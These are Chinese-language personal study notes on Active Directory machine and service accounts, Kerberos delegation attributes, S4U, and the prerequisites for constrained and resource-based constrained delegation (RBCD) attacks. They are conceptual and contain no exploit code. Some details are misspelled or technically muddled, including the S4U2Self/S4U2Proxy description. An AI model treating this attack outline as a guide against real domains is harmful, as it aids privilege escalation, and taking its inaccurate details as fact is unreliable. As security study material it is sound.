机器账号

  • 机器账户（或计算机账户）是Active Dirctory（AD域）的概念
    • 机器账户在AD里的Computer组里
  • 机器账户的命名规则非常固定，即**计算机名 + $**。归属就是它所在域的域名
  • 机器账户是有密码的。一般是120个字符，由Windows自动随机生成，默认每30天自动轮换一次
  • 计算机在开机连接域网络时，会在后台自动使用这个密码向域控制器进行身份验证，因此进行正常业务不需要知道密码
  • 主要用于计算机与域控制器之间的安全通信（比如更新组策略），以及计算机层面上的相互认证
  • 域内任何一个普通的低权限人类用户，都有权向域内添加最多10台计算机（即创建10个机器账户）

服务账户

  • 创建一个服务账号就是把一个普通的域账户注册为服务账户（绑定一个SPN）
  • 可能有弱口令，导致能进行Kerberoasting攻击（[[Kerberoasting攻击]]）

委派属性

  • 委派是域环境的一种机制，即A去B请求服务，B用A的身份向C请求服务
    • B是具有委派属性的账户
  • 域控允许机器账户（也称主机账户）或服务账户（有些服务在安装时会在域内自动注册服务账号）配置委派属性

不同的委派属性

  • [[域]]
servicePrincipalName
  • [[凭据与票据]]（这个不是委派属性）
userAccountControl(UAC 属性)
  • AD中的核心属性，是一个位掩码
  • 当这个属性中的 TRUSTED_FOR_DELEGATION (数值 524288) 标志位被勾选时，代表这台机器开启了非约束委派
msDS-AllowedToDelegateTo
  • 传统约束委派的核心，是一个字符串列表
  • 配置在前端服务器上，记录了可委派服务的SPN
  • 需要极高的域管权限才能配置（SeEnableDelegationPrivilege），且不够灵活
  • 宪政了前端服务器的目的地服务
msDS-AllowedToActOnBehalfOfOtherIdentity
  • RBCD（Resource-Based Constrained Delegation，基于资源的约束委派）的核心。
  • Windows Server 2012引入
  • 允许代表其他身份进行操作。本质上是一个访问控制列表（ACL）。
  • 用来定义谁有资格代表其它用户来访问自己
  • 权限配置颠倒过来了，直接配置在目标资源（被访问的机器）身上
  • 只要对目标机器账户拥有写权限（GenericWrite 等）就可以修改这个属性
  • 后端资源通过修改自己这个属性来决定信任哪个前端（即委派的控制权交给拥有被访问资源的管理员）
  • 配置：Set-ADComputer 或 Set-ADUser 命令，加上 -PrincipalsAllowedToDelegateToAccount 参数来合法配置
  • 可以通过修改目标机器的这个属性添加自己完全控制的机器账户来进行RBCD攻击
    • 修改后就是委派攻击的流程了

委派攻击（Delegation Attacks）

  • 参考：浅谈约束委派攻击-先知社区
  • 参考：奇安信攻防社区-红队域渗透技术：委派攻击汇总（全）
  • 在域环境中，如果配置不当，攻击者可以滥用机器账户的委派属性，伪造域管的凭证。
  • 如果机器配置了非约束委派，任何访问这台机器的用户，都会把自己的凭据留在机器上。如果拿下了这台机器，就能获得这些凭据，不安全性高
  • 如果是配置了约束委派，就能通过已知密码的普通账户，利用协议漏洞伪造高权限票据，通过委派机制进行攻击
    • 约束委派是对Kerberos的拓展，引入了S4U，是为了在委派种限制委派账户对特定服务的访问。约束委派分为仅使用Kerberos，不能进行协议转换和使用任何身份验证协议
      • S4U支持两个子协议：都允许服务代表用户从KDC请求ST
        • Service for User to Self (S4U2Self)：可以代表自身请求针对其自身的Kerberos ST
        • Service for User to Proxy (可以以用户的名义请求其它服务的ST)：可以以用户的名义请求其它服务的ST
          • 约束委派限制了S4U2Self扩展的范围，使得配置了委派属性的服务只能模拟用户身份访问特定的其他服务
  • 能伪造高权限用户的原因：向域控申请票据的时候走的是NTDS.dit里的认证而不是本地机器SAM里的认证，而AD数据库里只有一个管理员，那就是域管
    • Kerberos 是域级别的协议： 域控只负责管理和签发域内对象（域用户、域计算机）的身份凭证
    • 本地账号归机器自己管，域控不知道它们的密码，也无法为本地账号签发 Kerberos 票据

域委派流程

约束委派
  • 以服务账户为例（域内认证是通过Kerberos[[凭据与票据]])
  1. 域内用户A向服务账户B去请求C服务，并提供访问B的ST1
  2. B使用自己的TGT和A->B的ST1的向KDC发起A的票据申请
  3. KDC验证B的委派属性且申请的服务C在允许表中，则通过TGS返回A访问C的授权服务票据ST2
  4. B用A的ST2去访问服务C

  • 借图：
    ![[18.png]]

  • 由于B只能获取A的ST1而不能拿到TGT，因此只能模拟A去访问特定的服务，但如果拿到B的TGT|明文密码|NTLM Hash就能去伪造S4U请求，且只需要A的用户名

攻击
基于资源的约束委派
  • 在设置相关的约束委派的实现的时候不再需要域管理员自己去设置相关约束委派的属性，而操作权落在了当前登录的机器或者用户的手中
  • 约束性委派不能跨域进行委派，基于资源的约束性委派可以跨域和林
  • 不再需要域管理员权限设置委派，只需拥有在计算机对象上编辑msDS-AllowedToActOnBehaffOtherldentity属性权限将计算机加入域的域用户和机器自身拥有权限（添加服务A的SID，达到让服务A模拟用户访问B资源的目的）
条件
  1. 具有对主机修改msDS-AllowedToActOnBehalfOfOtherIdentity属性的权限(如已经控制的主机是WEB则具有修改WEB主机的msDS-AllowedToActOnBehalfOfOtherIdentity的权限账户)
  2. 可以创建机器账户的域用户（或已知机器账户）
  3. GenericWrite的权限???
什么用户能修改这个属性
  • 将主机加入域的用户(账户中有一个mSDS-CreatorSID属性，用于标记加入域时使用的用户的SID值，反查就可以知道是谁把机器加入域的了)
    • [[域]]域机器
  • Account Operator组成员
  • 该主机的机器账户
